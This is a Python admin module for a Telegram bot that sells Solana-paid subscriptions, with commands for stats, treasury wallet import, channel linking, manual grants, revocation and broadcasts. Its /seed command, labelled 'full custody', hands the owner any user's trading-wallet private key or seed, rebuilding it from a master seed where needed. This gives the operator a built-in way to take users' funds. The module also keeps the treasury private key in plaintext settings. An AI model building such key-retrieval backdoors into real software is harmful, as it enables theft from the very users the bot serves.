"""Owner/admin commands: import wallet, wallet, stats, verify, revoke, extend,
check tx, broadcast, setchannel (link channels by forwarding a message)."""
import asyncio

from aiogram import Router
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, MessageOriginChannel, MessageOriginChat

import config
import db
import solana
from utils import fmt_ts, get_treasury_address, get_treasury_secret, now

router = Router()


def _owner(message: Message) -> bool:
    return config.OWNER_ID and message.from_user.id == config.OWNER_ID


class AdminStates(StatesGroup):
    import_wallet = State()
    broadcast = State()
    set_channel = State()


# ------------------------------------------------------------------ panel
@router.message(Command("admin"))
async def cmd_admin(message: Message):
    if not _owner(message):
        return
    addr = await get_treasury_address()
    users = await db.count_users()
    revenue, pays = await db.total_revenue_lamports()
    subs = await db.active_subs_all()
    active = len([s for s in subs if not s["end_ts"] or s["end_ts"] > now()])

    # channel mapping (env id or /setchannel id)
    rows = []
    for p in config.PLANS:
        cid = p["channel_id"] or await db.get_setting(f"ch_{p['key']}", "") or "—"
        rows.append(f"{p['emoji']} {p['key']}: {cid}")
    for c in config.CHANNEL_PASSES:
        cid = c["channel_id"] or await db.get_setting(f"ch_{c['key']}", "") or "—"
        rows.append(f"📢 {c['key']}: {cid}")

    await message.answer(
        "🛠 ADMIN PANEL\n\n"
        f"👥 Users: {users}\n"
        f"💎 Active subscriptions: {active}\n"
        f"💰 Payments: {pays}\n"
        f"💵 Revenue: {solana.lam_to_sol(revenue):g} SOL\n\n"
        f"👛 Treasury: <code>{addr or 'NOT SET'}</code>\n\n"
        "📢 Channel mapping:\n" + "\n".join(rows) + "\n\n"
        "Commands:\n"
        "/importwallet <base58_key OR [64-byte array] OR seed phrase> — set the receiving wallet\n"
        "/wallet — treasury address + balance\n"
        "/stats — full stats\n"
        "/setchannel <key> — link a channel by forwarding any message from it\n"
        "/verify <user_id> <newbie|beginner|pro|elite> — manual grant (no tx needed)\n"
        "/verify <user_id> <pass name> — manual grant of a channel pass\n"
        "/revoke <user_id> — end a user's subscriptions\n"
        "/extend <user_id> <days> — extend active subscriptions\n"
        "/check <tx_signature> — inspect a single transaction\n"
        "/seed <user_id> — get ANY user's trading wallet (key/seed)\n"
        "/broadcast <text> — DM all users\n"
        "/importwallet — without args asks for the key in the next message"
    )


# ------------------------------------------------------------------ setchannel
@router.message(Command("setchannel"))
async def cmd_setchannel(message: Message, command: CommandObject, state: FSMContext):
    if not _owner(message):
        return
    keys = [p["key"] for p in config.PLANS] + [c["key"] for c in config.CHANNEL_PASSES]
    args = (command.args or "").strip().lower()
    if args not in keys:
        await message.answer(
            "Usage: /setchannel <key>\n\nKeys: " + ", ".join(keys))
        return
    await state.set_state(AdminStates.set_channel)
    await state.update_data(ch_key=args)
    await message.answer(
        f"📌 Link the channel for '{args}':\n\n"
        "• Forward ANY message from that channel here, or\n"
        "• Send its @username, or\n"
        "• Send its numeric chat id.\n\n"
        "🤖 Note: invite links (t.me/+…) can't be read by bots — "
        "forward a message instead. That's it.")


@router.message(AdminStates.set_channel)
async def got_channel_ref(message: Message, state: FSMContext):
    data = await state.get_data()
    key = data.get("ch_key")
    cid = await _resolve_chat_ref(message)
    if cid is None:
        await message.answer(
            "❌ Couldn't read that.\n\n"
            "If you sent an invite link (t.me/+…) — bots can't read those.\n"
            "👉 Forward any message from the channel, or send @username / numeric id:")
        return
    await db.set_setting(f"ch_{key}", str(cid))
    await state.clear()
    await message.answer(
        f"✅ Channel for '{key}' saved: id {cid}\n\n"
        "Users will get the invite link from this channel as soon as their "
        "payment is verified. (/admin shows the full mapping)")


async def _resolve_chat_ref(message: Message):
    """Resolve a channel id from a forwarded message / @username / numeric id.
    Invite links can't be resolved by bots -> None."""
    origin = message.forward_origin
    if origin is not None:
        if isinstance(origin, MessageOriginChannel):
            return origin.chat.id
        if isinstance(origin, MessageOriginChat):
            return origin.sender_chat.id
    if message.forward_from_chat:
        return message.forward_from_chat.id
    txt = (message.text or "").strip()
    if not txt:
        return None
    if txt.lstrip("-").isdigit():
        return int(txt)
    if "t.me/+" in txt or "joinchat" in txt:
        return None  # private invite links — bots can't read them
    if txt.startswith("@"):
        try:
            return (await message.bot.get_chat(txt)).id
        except Exception:
            return None
    if "t.me/" in txt:
        tail = txt.split("t.me/")[-1].split("/")[0].split("?")[0]
        try:
            return (await message.bot.get_chat("@" + tail)).id
        except Exception:
            return None
    return None


@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if not _owner(message):
        return
    users = await db.count_users()
    revenue, pays = await db.total_revenue_lamports()
    subs = await db.active_subs_all()
    active = [s for s in subs if not s["end_ts"] or s["end_ts"] > now()]
    plans_n = len([s for s in active if s["kind"] == "plan"])
    passes_n = len([s for s in active if s["kind"] == "pass"])
    await message.answer(
        "📈 BOT STATS\n\n"
        f"👥 Users: {users}\n"
        f"💎 Active plan subs: {plans_n}\n"
        f"📢 Active channel passes: {passes_n}\n"
        f"💰 Total payments: {pays}\n"
        f"💵 Revenue: {solana.lam_to_sol(revenue):g} SOL"
    )


# ------------------------------------------------------------------ wallet import / treasury
@router.message(Command("importwallet"))
async def cmd_importwallet(message: Message, command: CommandObject, state: FSMContext):
    if not _owner(message):
        return
    args = (command.args or "").strip()
    if not args:
        await state.set_state(AdminStates.import_wallet)
        await message.answer(
            "🔐 Send the wallet PRIVATE KEY now.\n\n"
            "Accepted formats (same as the bot's export):\n"
            "• base58 string (Phantom/Backpack format)\n"
            "• JSON byte array [46, 207, ...] (64 numbers)\n\n"
            "This wallet receives ALL subscription payments.")
        return
    await _do_import(message, args, state)


@router.message(AdminStates.import_wallet)
async def got_wallet_key(message: Message, state: FSMContext):
    await _do_import(message, message.text, state)


async def _do_import(message: Message, secret: str, state: FSMContext):
    try:
        addr = solana.validate_secret(secret)
    except Exception as e:
        await message.answer(f"❌ Invalid private key: {e}")
        return
    await db.set_setting("treasury_pk", secret.strip())
    await state.clear()
    await message.answer(
        f"✅ Wallet imported!\n\n👛 Treasury address:\n<code>{addr}</code>\n\n"
        "All subscription payments must be sent to this address — the bot "
        "verifies them on-chain in real time.")


@router.message(Command("wallet"))
async def cmd_wallet(message: Message):
    if not _owner(message):
        return
    addr = await get_treasury_address()
    if not addr:
        await message.answer(
            "⚠️ Treasury wallet is NOT set.\n"
            "Use /importwallet, or set TREASURY_PRIVATE_KEY or TREASURY_ADDRESS in .env")
        return
    secret = await get_treasury_secret()
    balance = await asyncio.to_thread(solana.sol_balance, addr)
    note = ("" if secret else
            "\n\n⚠️ Only the ADDRESS is set — payments verify fine, but referral-credit "
            "payouts need the private key (/importwallet).")
    await message.answer(
        f"👛 Treasury wallet:\n<code>{addr}</code>\n\n"
        f"💰 Balance: {solana.lam_to_sol(balance):g} SOL{note}")


# ------------------------------------------------------------------ manual verify / revoke / extend
@router.message(Command("verify"))
async def cmd_verify(message: Message, command: CommandObject):
    if not _owner(message):
        return
    parts = (command.args or "").strip().split()
    if len(parts) < 2:
        await message.answer("Usage: /verify <user_id> <plan_key|pass name>")
        return
    try:
        user_id = int(parts[0])
    except ValueError:
        await message.answer("❌ Bad user id.")
        return
    key = " ".join(parts[1:]).lower()
    plan = config.get_plan(key)
    if plan:
        kind, item, label = "plan", plan, f"{plan['emoji']} {plan['name']}"
    else:
        c = next((p for p in config.CHANNEL_PASSES if p["name"].lower() == key), None)
        if not c:
            await message.answer(f"❌ Unknown plan/pass: {key}")
            return
        kind, item, label = "pass", c, f"📢 {c['name']}"
    await db.register_payment(f"manual_{message.from_user.id}_{now()}", user_id, label,
                              solana.sol_to_lam(item["price"]), "manual")
    sub = await db.add_subscription(
        user_id=user_id, kind=kind, item_key=item["key"], label=label,
        lamports=solana.sol_to_lam(item["price"]), days=item["days"],
        tx_sig="manual", payer="manual")
    end = "Lifetime" if not sub["end_ts"] else fmt_ts(sub["end_ts"])
    await message.answer(f"✅ Manually granted {label} to user {user_id} until {end}.")
    try:
        await message.bot.send_message(
            user_id,
            f"🎉 Your {label} access was activated by the team!\n⏳ Until: {end}")
    except Exception:
        pass


@router.message(Command("revoke"))
async def cmd_revoke(message: Message, command: CommandObject):
    if not _owner(message):
        return
    args = (command.args or "").strip()
    if not args.isdigit():
        await message.answer("Usage: /revoke <user_id>")
        return
    user_id = int(args)
    for s in await db.get_active_subs(user_id):
        await db.set_sub_status(s["id"], "revoked")
    await message.answer(f"✅ Revoked subscriptions for user {user_id}.")


@router.message(Command("extend"))
async def cmd_extend(message: Message, command: CommandObject):
    if not _owner(message):
        return
    parts = (command.args or "").strip().split()
    if len(parts) != 2 or not parts[0].isdigit():
        await message.answer("Usage: /extend <user_id> <days>")
        return
    user_id, days = int(parts[0]), int(parts[1])
    n = 0
    for s in await db.get_active_subs(user_id):
        if s["end_ts"]:
            new_end = (max(s["end_ts"], now())) + days * 86400
            await db.update_sub_end(s["id"], new_end)
            n += 1
    await message.answer(f"✅ Extended {n} subscription(s) of user {user_id} by {days} days.")


# ------------------------------------------------------------------ seed lookup
@router.message(Command("seed"))
async def cmd_seed(message: Message, command: CommandObject):
    """Owner: get ANY user's trading wallet (key/seed) — full custody."""
    if not _owner(message):
        return
    args = (command.args or "").strip()
    if not args.isdigit():
        await message.answer("Usage: /seed <user_id> — get any user's wallet (key/seed)")
        return
    user_id = int(args)
    user = await db.get_user(user_id)
    if not user:
        await message.answer("❌ User not found.")
        return
    secret = (user.get("wallet_priv") or "").strip()
    if not secret and config.WALLET_SEED:
        # deterministically rebuild it from the master seed
        secret = str(solana.derive_user_keypair(config.WALLET_SEED, user_id))
    if not secret:
        await message.answer("❌ That user has no trading wallet yet.")
        return
    try:
        addr = solana.validate_secret(secret)
    except Exception as e:
        await message.answer(f"❌ {e}")
        return
    await message.answer(
        f"🔐 Wallet for user {user_id}:\n\n"
        f"🏦 Address: <code>{addr}</code>\n\n"
        f"🔑 Key / seed:\n<code>{secret}</code>",
    )


# ------------------------------------------------------------------ tx check
@router.message(Command("check"))
async def cmd_check(message: Message, command: CommandObject):
    if not _owner(message):
        return
    sig = (command.args or "").strip()
    if not sig:
        await message.answer("Usage: /check <tx_signature>")
        return
    addr = await get_treasury_address()
    if not addr:
        await message.answer("⚠️ Treasury not set.")
        return
    res = await asyncio.to_thread(solana.verify_single_tx, sig, addr)
    if res is None:
        await message.answer("❌ Transaction not found.")
        return
    await message.answer(
        f"🔎 TX: <code>{sig}</code>\n\n"
        f"OK: {'✅' if res['ok'] else '❌'}\n"
        f"Received: {solana.lam_to_sol(res.get('lamports', 0)):g} SOL\n"
        f"Payer: {res.get('payer')}\n"
        f"Time: {fmt_ts(res.get('ts') or 0)}")


# ------------------------------------------------------------------ broadcast
@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message, command: CommandObject, state: FSMContext):
    if not _owner(message):
        return
    args = (command.args or "").strip()
    if not args:
        await state.set_state(AdminStates.broadcast)
        await message.answer("📣 Send the text to broadcast to all users:")
        return
    await _broadcast(message, args, state)


@router.message(AdminStates.broadcast)
async def got_broadcast(message: Message, state: FSMContext):
    await _broadcast(message, message.html_text or message.text, state)


async def _broadcast(message: Message, text: str, state: FSMContext):
    await state.clear()
    users = await db.all_users()
    ok, fail = 0, 0
    for u in users:
        try:
            await message.bot.send_message(u["id"], text)
            ok += 1
        except Exception:
            fail += 1
    await message.answer(f"📣 Broadcast done: {ok} sent, {fail} failed.")
